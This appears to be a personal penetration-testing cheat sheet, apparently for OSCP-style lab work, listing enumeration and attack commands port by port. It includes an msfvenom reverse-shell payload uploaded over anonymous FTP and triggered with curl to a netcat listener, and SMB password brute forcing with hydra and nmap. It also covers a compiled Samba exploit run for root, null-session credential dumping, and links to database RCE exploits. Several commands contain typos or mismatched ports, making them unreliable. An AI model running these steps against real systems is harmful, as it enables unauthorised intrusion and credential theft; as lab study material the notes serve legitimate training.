Methodology:
Review these sites if you get stuck
https://book.hacktricks.wiki/en/index.html

Start every terminal command with this, and label the IP address in the terminal window
export target=ip

Recon:
nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt
run nmap 2x, review the log

Use Unicorn scan as well:
unicornscan -v -I -i <interface> -mT <target_IP_address_or_range>
Note: most likely use tun0

Then work on each port
Easy wins
port 21: 
Can I get anonymous access
Can I use the get or put commands
Review the website as well:
https://hackviser.com/tactics/pentesting/services/ftp

With MS FTP:
Make the shell:
msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=443 -f asp > shell.aspx
nc -lvnp 433
ftp $target
anonymous
anonymous
put shell.aspx
ls (to check)
curl http://$target/shell.aspx 
check netcat 

What version is the ftp? If it's vsftpd 2.3.4, there's a Metasploit for that, and if there is a Metasploit model, then there is a repo on GitHub.

Ssh 22:
use for many ways, but also not an easy win at times, but a leverage to get access and also to PrivEsc
Don't bother with Windows, but also review this link:
https://github.com/saisathvik1/OSCP-Cheatsheet

Telnet 23:
banner grabbing and get access anonymously

Smtp 25:
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smtp-enumeration-port-25
Also good to review, too, not just SMTP

DNS 53:
enumerate 

pop3 110:
enumerate 
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/pop3-port-110-25

For SQL, 1433, 3306, 5432, 1521, 
default creds?
yes, 
PostgreSQL:
https://github.com/squid22/PostgreSQL_RCE
Mongo as well:
https://www.exploit-db.com/exploits/24947

Others, review these:
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/mssql-port-1433
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/oracle-port-152
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/mysql-port-3306


SMB 139/445:
Can I get access with no user or guest account?
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smb-enumeration
enum4linux-ng $target | tee enum4linuxng.log
Find the list as well:
smbclient -L \\\\$target\
netexec smb $target -u 'guest' -p '' --shares
smbmap -H $target

Also --rid-brute is your friend 
netexec smb $target -u 'guest' -p '' --rid-brute

Then, if you found something in the list
smbclient -U "" '//$target/Sharename/' 
then run 
dir 
cd (to path)
dir
mget* (get the file) 
Note this could be a database, txt, xlsm, code, get it, you most likely will 

To upload
smbmap -H $target --upload example.exe 'Share\example.exe'

One win that is worth trying:
lookupsid.py anonymous@target

Brute force (be careful):
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $target  -vvvv -oN userspasssmb.txt
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $target smb

EASY WIN WITH SAMBA:
Samba 2.2.7a

searchsploit -m multiple/remote/10.c

gcc 10.c -o 10  

./10 -b 0 -c me -v $target
whoami
Check for root


RPC 135:
rpcclient -U "" -N $target
Note: or with a user 

Commands:
srvvinfo
endumdomusers
getdompwinfo

Dumb user creds with null or without:
impacket-rpcdump domain.local/"":""@$target

SNMP 161:
snmp check:
snmpcheck -t $target -c public
Review link:
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/snmp-enumeraion

NFS 111,2049:
rpcinfo -p $target

Mount NFS share:
Show all
showmount -e $target
Review link:
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/nfs-enumeration-port-111-2049

Website enumerations and also easy wins:
80,443,8080,8081, etc...
Any port can be used for websites, really or technology
